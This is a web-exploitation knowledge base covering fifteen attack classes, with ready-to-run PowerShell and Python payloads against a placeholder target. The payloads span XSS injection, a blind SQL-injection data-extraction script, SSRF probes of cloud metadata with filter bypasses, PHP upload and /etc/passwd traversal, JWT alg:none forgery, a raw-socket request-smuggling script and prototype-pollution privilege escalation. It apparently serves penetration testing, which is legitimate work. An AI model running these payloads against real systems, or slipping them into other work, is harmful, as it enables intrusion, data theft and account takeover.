# Web Exploit (native) — Knowledge Base
_Last updated: 2026-06-25_

Web vulnerability classes probed and exploited with native HTTP primitives (`Invoke-WebRequest`, `Invoke-RestMethod`) and Tier-1 scripts when needed. No automated SQL-injection tool, no intercepting-proxy extensions — raw requests.

## Index
| # | Technique | When | Tier | Tags |
|---|-----------|------|------|------|
| T1 | Reflected XSS probe | User input reflected in HTML response | 0-native | web-testing, xss |
| T2 | Stored XSS probe | Input persisted and rendered to other users | 0-native | web-testing, xss |
| T3 | SQL injection (error/blind) | Suspect SQLi in a parameter | 0-native | web-testing, sqli |
| T4 | SQL injection extraction | Confirmed SQLi — need to extract data | 1-python | web-testing, sqli, tier1-python |
| T5 | IDOR / broken object-level auth | Predictable object references | 0-native | web-testing, idor, auth |
| T6 | SSRF | Parameter takes a URL or hostname | 0-native | web-testing, ssrf |
| T7 | Server-side template injection (SSTI) | Input rendered by a template engine | 0-native | web-testing, ssti |
| T8 | Authentication bypass | Login/session logic flaws | 0-native | web-testing, auth |
| T9 | File upload / path traversal | Upload endpoint or file-path parameter | 0-native | web-testing, file-upload, path-traversal |
| T10 | Insecure deserialization | App deserializes user-controlled data | 0-native | web-testing, deserialization |
| T11 | JWT attacks | JWT-based auth with weak config | 0-native | web-testing, jwt |
| T12 | Open redirect | Redirect parameter in URL | 0-native | web-testing, redirect |
| T13 | CORS misconfiguration | API reflects Origin or allows * | 0-native | web-testing, cors |
| T14 | Request smuggling | HTTP/1.1 behind reverse proxy | 1-python | web-testing, smuggling, tier1-python |
| T15 | Prototype pollution | Node.js / JS object merge in input | 0-native | web-testing, prototype-pollution |

## Techniques

### T1: Reflected XSS probe
Tags: web-testing, xss
When: User input (query param, header, path) is reflected in the HTML response without encoding.
Why: If the app echoes input unescaped, injecting script tags or event handlers achieves XSS. Native HTTP requests can inject and inspect the response for reflection.
Tier: 0-native
Steps: 1. Identify reflection points 2. Inject canary 3. Check if canary appears unescaped 4. Escalate to a working payload
Payload:
```powershell
$canary = "hkaud" + (Get-Random -Max 9999)
$url = "https://target.example/search?q=$canary<script>alert(1)</script>"
$r = Invoke-WebRequest $url -UseBasicParsing
if ($r.Content -match [regex]::Escape("$canary<script>")) {
    "[XSS] Reflected unescaped at $url"
} elseif ($r.Content -match $canary) {
    "[REFLECT] Canary reflected but encoded — try event handlers / attribute injection"
}
```
Signal: canary reflected unescaped in response body. | Pitfall: WAFs may block `<script>` — try event handlers (`onerror`, `onload`), SVG tags, or encoding variants. Check all reflection contexts (attribute, JS string, URL).
Source: distilled native XSS probe — 2026-06-25

### T2: Stored XSS probe
Tags: web-testing, xss
When: Input is saved (profile name, comment, ticket body) and rendered to other users.
Why: Stored XSS fires for every user who views the page — higher impact than reflected. Submit a canary, then view the page as another user/session.
Tier: 0-native
Steps: 1. Submit canary payload via the storage endpoint 2. View the rendering endpoint 3. Check for unescaped output
Payload:
```powershell
# submit
$body = @{ name = 'test<img src=x onerror=alert(document.domain)>' } | ConvertTo-Json
Invoke-RestMethod "https://target.example/api/profile" -Method PUT -ContentType 'application/json' -Body $body -Headers @{Authorization="Bearer $tok"}

# check rendering
$page = Invoke-WebRequest "https://target.example/user/123" -UseBasicParsing
if ($page.Content -match 'onerror=alert') { "[STORED-XSS] Payload rendered unescaped" }
```
Signal: payload fires in the rendered page. | Pitfall: some apps sanitize on output, not input — the stored value may differ from what's rendered. Check the raw API response too.
Source: distilled native stored-XSS probe — 2026-06-25

### T3: SQL injection (error/blind)
Tags: web-testing, sqli
When: Suspect a parameter is interpolated into SQL (error messages, different responses with `'`, `' OR 1=1--`).
Why: A single-quote that triggers a 500 or a different response indicates SQLi. Native HTTP requests can inject and observe. No automated SQL-injection tool needed for detection.
Tier: 0-native
Steps: 1. Inject `'` and observe 2. Try boolean-based (`' OR 1=1-- -` vs `' OR 1=2-- -`) 3. Try time-based (`'; WAITFOR DELAY '0:0:5'-- -`) 4. Note the DBMS from error messages
Payload:
```powershell
$base = "https://target.example/api/items?id="

# error-based
try { Invoke-WebRequest "${base}1'" -UseBasicParsing -EA Stop } catch { $_.Exception.Message }

# boolean-based
$true_r  = (Invoke-WebRequest "${base}1' OR '1'='1" -UseBasicParsing).Content.Length
$false_r = (Invoke-WebRequest "${base}1' OR '1'='2" -UseBasicParsing).Content.Length
if ($true_r -ne $false_r) { "[SQLI] Boolean-based: true=$true_r false=$false_r" }

# time-based (MSSQL)
$sw = [Diagnostics.Stopwatch]::StartNew()
Invoke-WebRequest "${base}1'; WAITFOR DELAY '0:0:5'-- -" -UseBasicParsing -EA SilentlyContinue
$sw.Stop()
if ($sw.ElapsedMilliseconds -gt 4500) { "[SQLI] Time-based: ${sw.ElapsedMilliseconds}ms" }
```
Signal: error / boolean diff / time delay confirms SQLi. | Pitfall: adjust syntax for the DBMS (MySQL `SLEEP(5)`, PostgreSQL `pg_sleep(5)`). Blind SQLi confirmation takes multiple requests — don't stop at one.
Source: distilled native SQLi detection — 2026-06-25

### T4: SQL injection extraction
Tags: web-testing, sqli, tier1-python
When: Confirmed SQLi — need to extract data (DB version, tables, rows).
Why: Blind data extraction requires automated binary-search or time-based loops over many requests. A Python script handles the logic cleanly.
Tier: 1-python
Escalation: blind SQLi data extraction (binary search per character, hundreds of requests) is impractical to orchestrate in a PowerShell loop with adequate error handling; Python provides cleaner control flow.
Steps: 1. Confirm injection type (boolean/time/error/union) 2. Script the extraction 3. Record findings
Payload:
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: blind binary-search extraction
import sys, urllib.request, urllib.parse, time

URL   = sys.argv[1]   # e.g. "https://target.example/api/items?id="
QUERY = sys.argv[2]   # e.g. "SELECT version()"
MODE  = sys.argv[3] if len(sys.argv) > 3 else "boolean"  # boolean | time

result = []
for pos in range(1, 256):
    lo, hi = 32, 126
    while lo <= hi:
        mid = (lo + hi) // 2
        if MODE == "boolean":
            inj = f"1' AND ASCII(SUBSTRING(({QUERY}),{pos},1))>{mid}-- -"
            r = urllib.request.urlopen(URL + urllib.parse.quote(inj), timeout=10)
            if len(r.read()) > 500:   # adjust threshold to "true" response size
                lo = mid + 1
            else:
                hi = mid - 1
        elif MODE == "time":
            inj = f"1'; IF(ASCII(SUBSTRING(({QUERY}),{pos},1))>{mid}) WAITFOR DELAY '0:0:2'-- -"
            t0 = time.time()
            try: urllib.request.urlopen(URL + urllib.parse.quote(inj), timeout=10)
            except: pass
            if time.time() - t0 > 1.5:
                lo = mid + 1
            else:
                hi = mid - 1
    ch = chr(lo)
    if lo > 126:
        break
    result.append(ch)
    print(f"[pos {pos}] {''.join(result)}", flush=True)

print(f"\n[RESULT] {''.join(result)}")
```
Signal: extracted data printed. | Pitfall: tune the true/false threshold to the specific app's response. Rate-limit to avoid lockout.
Source: distilled native SQLi extraction — 2026-06-25

### T5: IDOR / broken object-level auth
Tags: web-testing, idor, auth
When: API uses predictable IDs (numeric, sequential UUID patterns) and may not enforce ownership.
Why: Swapping the object ID in a request and receiving another user's data is a critical auth flaw. Trivial to test with native HTTP.
Tier: 0-native
Steps: 1. Identify endpoints with object references 2. Auth as user A 3. Request user B's object 4. Compare responses
Payload:
```powershell
$headers = @{ Authorization = "Bearer $tokenUserA" }
# own resource
$own = Invoke-RestMethod "https://target.example/api/orders/1001" -Headers $headers
# another user's resource
$other = Invoke-RestMethod "https://target.example/api/orders/1002" -Headers $headers
if ($other) { "[IDOR] Accessed order 1002 as user A: $($other | ConvertTo-Json -Depth 1)" }
```
Signal: received another user's data. | Pitfall: some APIs return 200 with empty/generic data — compare field values, not just status codes. Test PUT/DELETE too, not just GET.
Source: distilled native IDOR probe — 2026-06-25

### T6: SSRF
Tags: web-testing, ssrf
When: A parameter accepts a URL, hostname, or IP and the server fetches it (webhooks, image processors, PDF generators, URL previews).
Why: Making the server request an internal resource (metadata endpoint, localhost services) bypasses network segmentation. The callback confirms the server-side fetch.
Tier: 0-native
Steps: 1. Identify URL-accepting params 2. Submit internal targets (169.254.169.254, 127.0.0.1, internal hostnames) 3. Check for data leakage or OAST callback
Payload:
```powershell
# test with OAST callback
$oast = "https://your-oast.example/ssrf-test"
Invoke-RestMethod "https://target.example/api/preview" -Method POST -ContentType 'application/json' -Body (@{url=$oast} | ConvertTo-Json)

# cloud metadata (AWS)
Invoke-RestMethod "https://target.example/api/preview" -Method POST -ContentType 'application/json' -Body (@{url="http://169.254.169.254/latest/meta-data/"} | ConvertTo-Json)

# bypass filters
@("http://127.0.0.1","http://0x7f000001","http://[::1]","http://127.1","http://0177.0.0.1") | ForEach-Object {
    $body = @{url="$_/admin"} | ConvertTo-Json
    try { Invoke-RestMethod "https://target.example/api/preview" -Method POST -ContentType 'application/json' -Body $body } catch {}
}
```
Signal: server fetches your OAST URL, or returns internal data (metadata, localhost page). | Pitfall: SSRF filters often block `127.0.0.1` but miss octal/hex/IPv6 representations. DNS rebinding is another bypass — register a domain that resolves to an internal IP.
Source: distilled native SSRF probe — 2026-06-25

### T7: SSTI (Server-Side Template Injection)
Tags: web-testing, ssti
When: User input is rendered by a server-side template engine (Jinja2, Twig, Freemarker, etc.).
Why: If the app evaluates `{{7*7}}` and returns `49`, the template engine is interpreting user input — often leads to RCE.
Tier: 0-native
Steps: 1. Inject polyglot template probe 2. Check response for evaluated result 3. Identify engine 4. Escalate
Payload:
```powershell
$probes = @("{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "{php}echo 7*7;{/php}")
$probes | ForEach-Object {
    $r = Invoke-WebRequest "https://target.example/render?name=$_" -UseBasicParsing
    if ($r.Content -match '49') {
        "[SSTI] Probe '$_' evaluated — engine renders math"
    } elseif ($r.Content -match '7777777') {
        "[SSTI] Jinja2-style string multiplication detected with '$_'"
    }
}
```
Signal: `49` or `7777777` in response. | Pitfall: `{{7*'7'}}` returns `7777777` in Jinja2 (string repeat) vs `49` in Twig (math) — use this to fingerprint the engine. RCE payloads are engine-specific.
Source: distilled native SSTI probe — 2026-06-25

### T8: Authentication bypass
Tags: web-testing, auth
When: Testing login/session logic for flaws.
Why: Auth bypasses (default creds, JWT none, session fixation, privilege escalation, missing auth on endpoints) are high-impact and testable with raw HTTP.
Tier: 0-native
Steps: 1. Test default/common creds 2. Test unauthenticated access to protected endpoints 3. Test role escalation (change role param / JWT claim) 4. Test session handling (fixation, concurrent sessions)
Payload:
```powershell
# unauthenticated access to admin endpoints
@("/admin","/api/admin/users","/api/internal/config","/actuator/env","/debug","/graphql") | ForEach-Object {
    try {
        $r = Invoke-WebRequest "https://target.example$_" -UseBasicParsing -EA Stop
        "[AUTH-BYPASS] $_ returned $($r.StatusCode)"
    } catch {}
}

# role escalation: modify role in request
$body = @{email="user@test.com";password="test";role="admin"} | ConvertTo-Json
Invoke-RestMethod "https://target.example/api/register" -Method POST -ContentType 'application/json' -Body $body

# test 2FA bypass: skip the 2FA step and go straight to the post-auth endpoint
Invoke-WebRequest "https://target.example/dashboard" -UseBasicParsing -Headers @{Cookie="session=$sessionCookie"}
```
Signal: access to protected resources without proper auth. | Pitfall: test both the UI flow AND the raw API — many apps enforce auth only in the frontend.
Source: distilled native auth bypass — 2026-06-25

### T9: File upload / path traversal
Tags: web-testing, file-upload, path-traversal
When: App has a file upload endpoint or accepts file paths in parameters.
Why: Unrestricted upload (webshell) or path traversal (`../../etc/passwd`) gives file read/write — high impact.
Tier: 0-native
Steps: 1. Upload with various extensions (.php, .aspx, .jsp, .html) 2. Check if the file is accessible/executable 3. Test path traversal in filename or path params
Payload:
```powershell
# file upload with content-type bypass
$boundary = [guid]::NewGuid().ToString()
$body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/png

<?php echo 'RCE_PROOF'; ?>
--$boundary--
"@
Invoke-WebRequest "https://target.example/upload" -Method POST -ContentType "multipart/form-data; boundary=$boundary" -Body $body -UseBasicParsing

# path traversal
@("....//....//....//etc/passwd","..%2f..%2f..%2fetc/passwd","..%252f..%252f..%252fetc/passwd") | ForEach-Object {
    try {
        $r = Invoke-WebRequest "https://target.example/files?path=$_" -UseBasicParsing -EA Stop
        if ($r.Content -match 'root:') { "[PATH-TRAV] $_ : /etc/passwd readable" }
    } catch {}
}
```
Signal: uploaded file executes / traversal reads a system file. | Pitfall: many bypass techniques — double extensions (`.php.png`), null bytes (`%00`), case variations, content-type mismatch.
Source: distilled native file-upload/traversal — 2026-06-25

### T10: Insecure deserialization
Tags: web-testing, deserialization
When: App deserializes user-controlled data (Java `ObjectInputStream`, .NET `BinaryFormatter`, Python `pickle`, PHP `unserialize`).
Why: Deserialization of untrusted data leads to RCE in many frameworks. Identify the format, then craft a payload.
Tier: 0-native
Steps: 1. Identify serialized data (base64 blobs in cookies/params, `rO0AB` = Java, `AAEAAAD` = .NET) 2. Craft or modify the payload 3. Submit and observe
Payload:
```powershell
# detect Java serialization (magic bytes)
$cookie = "userdata=rO0ABXNyABFqYXZhLm..."
if ($cookie -match 'rO0AB') { "[DESER] Java ObjectInputStream detected in cookie" }

# detect .NET BinaryFormatter
if ($cookie -match 'AAEAAAD') { "[DESER] .NET BinaryFormatter detected" }

# detect Python pickle (base64 decode and check for \x80\x04\x95)
$decoded = [Convert]::FromBase64String($cookieValue)
if ($decoded[0] -eq 0x80) { "[DESER] Python pickle detected" }
```
Signal: serialized format identified → craft payload per framework. | Pitfall: modern frameworks have moved to JSON — classic deser bugs are rarer but devastating when found. Check ViewState, SAML assertions, session cookies.
Source: distilled native deser detection — 2026-06-25

### T11: JWT attacks
Tags: web-testing, jwt
When: App uses JWT for auth (header.payload.signature in cookies/headers).
Why: Weak JWT configs (none algorithm, weak secret, algorithm confusion RS256→HS256, missing expiry) allow token forgery.
Tier: 0-native
Steps: 1. Decode the JWT 2. Test `alg: none` 3. Test weak secret (brute with a wordlist) 4. Test algorithm confusion
Payload:
```powershell
# decode JWT (no tools needed — it's base64)
$jwt = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature"
$parts = $jwt -split '\.'
$header  = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($parts[0] + "=" * (4 - $parts[0].Length % 4))))
$payload = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($parts[1] + "=" * (4 - $parts[1].Length % 4))))
"Header:  $header"
"Payload: $payload"

# forge with alg:none
$h = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"alg":"none","typ":"JWT"}')) -replace '=','' -replace '\+','-' -replace '/','_'
$p = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"user":"admin","role":"admin"}')) -replace '=','' -replace '\+','-' -replace '/','_'
$forged = "$h.$p."
Invoke-RestMethod "https://target.example/api/me" -Headers @{Authorization="Bearer $forged"}
```
Signal: forged token accepted → auth bypass. | Pitfall: `alg:none` is the first check but most modern libs reject it. Algorithm confusion (RS256→HS256 using the public key as HMAC secret) is more likely to work. For secret brute-force, use the forge script (`flows-forge.md`).
Source: distilled native JWT attacks — 2026-06-25

### T12: Open redirect
Tags: web-testing, redirect
When: A parameter controls a redirect destination (`?next=`, `?url=`, `?redirect=`).
Why: Open redirects enable phishing and can chain into SSRF or OAuth token theft. Low severity alone but valuable in chains.
Tier: 0-native
Steps: 1. Identify redirect params 2. Test external redirect 3. Test bypass variants
Payload:
```powershell
$base = "https://target.example/login?next="
@("https://evil.example","//evil.example","/\evil.example","https://target.example@evil.example") | ForEach-Object {
    $r = Invoke-WebRequest "$base$_" -UseBasicParsing -MaximumRedirection 0 -EA SilentlyContinue
    if ($r.Headers.Location -match 'evil') { "[REDIRECT] $_ → $($r.Headers.Location)" }
}
```
Signal: `Location` header points to attacker domain. | Pitfall: often chains with OAuth (`redirect_uri` parameter) for token theft — that's where the real impact is.
Source: distilled native open-redirect probe — 2026-06-25

### T13: CORS misconfiguration
Tags: web-testing, cors
When: API returns `Access-Control-Allow-Origin` headers.
Why: If the API reflects any `Origin` or allows `null`, an attacker page can read authenticated responses cross-origin.
Tier: 0-native
Steps: 1. Send request with custom Origin header 2. Check ACAO + ACAC headers
Payload:
```powershell
$origins = @("https://evil.example","null","https://target.example.evil.example","https://eviltarget.example")
$origins | ForEach-Object {
    $r = Invoke-WebRequest "https://target.example/api/me" -UseBasicParsing -Headers @{Origin=$_}
    $acao = $r.Headers['Access-Control-Allow-Origin']
    $acac = $r.Headers['Access-Control-Allow-Credentials']
    if ($acao -eq $_ -and $acac -eq 'true') {
        "[CORS] Origin '$_' reflected with credentials allowed"
    }
}
```
Signal: origin reflected + credentials allowed. | Pitfall: `Access-Control-Allow-Origin: *` without credentials is usually not exploitable (browsers won't send cookies). The dangerous combo is reflected origin + `Allow-Credentials: true`.
Source: distilled native CORS probe — 2026-06-25

### T14: Request smuggling
Tags: web-testing, smuggling, tier1-python
When: Target is behind a reverse proxy (CDN, load balancer) and uses HTTP/1.1.
Why: CL.TE or TE.CL desync between front-end and back-end lets you smuggle a request that the backend interprets differently — can poison other users' requests, bypass auth, or achieve cache poisoning.
Tier: 1-python
Escalation: request smuggling requires precise control over raw HTTP bytes (malformed headers, partial chunk encoding) that `Invoke-WebRequest` normalizes; Python `socket` gives byte-level control.
Steps: 1. Detect desync (timing differential with CL vs TE) 2. Confirm with a smuggled request 3. Demonstrate impact
Payload:
```python
#!/usr/bin/env python3
# Tier: 1-python | Escalation: raw socket for byte-level HTTP control
import socket, ssl, sys, time

HOST = sys.argv[1]
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 443

def send_raw(data):
    s = socket.socket()
    s.settimeout(10)
    if PORT == 443:
        s = ssl.wrap_socket(s)
    s.connect((HOST, PORT))
    s.sendall(data)
    time.sleep(2)
    try:
        return s.recv(4096)
    except:
        return b""
    finally:
        s.close()

# CL.TE detection: front uses Content-Length, back uses Transfer-Encoding
payload = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Content-Length: 6\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"\r\n"
    f"0\r\n"
    f"\r\n"
    f"X"
).encode()

t0 = time.time()
r = send_raw(payload)
elapsed = time.time() - t0
print(f"Response in {elapsed:.1f}s: {r[:200]}")
if elapsed > 5:
    print("[SMUGGLE] Possible CL.TE desync (backend timed out waiting for chunk body)")
```
Signal: timing differential or desync behavior. | Pitfall: smuggling is destructive (can affect other users' requests in prod) — test on staging or with extreme care in prod. Use the detect-only approach first.
Source: distilled native request smuggling — 2026-06-25

### T15: Prototype pollution
Tags: web-testing, prototype-pollution
When: Node.js backend merges user-controlled JSON into objects (lodash `_.merge`, `Object.assign` with nested input).
Why: Setting `__proto__` properties on server-side objects can modify application behavior — bypass auth checks, enable admin features, or chain to RCE.
Tier: 0-native
Steps: 1. Identify merge/assign endpoints 2. Submit `__proto__` payload 3. Observe side effects
Payload:
```powershell
# test prototype pollution via JSON body
$body = '{"__proto__":{"isAdmin":true}}'
Invoke-RestMethod "https://target.example/api/settings" -Method PUT -ContentType 'application/json' -Body $body -Headers @{Authorization="Bearer $tok"}

# check if it stuck
$me = Invoke-RestMethod "https://target.example/api/me" -Headers @{Authorization="Bearer $tok"}
if ($me.isAdmin) { "[PROTO-POLLUTION] isAdmin=true via __proto__" }

# alternative key
$body2 = '{"constructor":{"prototype":{"isAdmin":true}}}'
Invoke-RestMethod "https://target.example/api/settings" -Method PUT -ContentType 'application/json' -Body $body2 -Headers @{Authorization="Bearer $tok"}
```
Signal: property appears on objects that shouldn't have it. | Pitfall: pollution is global to the process — it affects all users until restart. Test carefully and document cleanup (restart the service).
Source: distilled native prototype-pollution probe — 2026-06-25
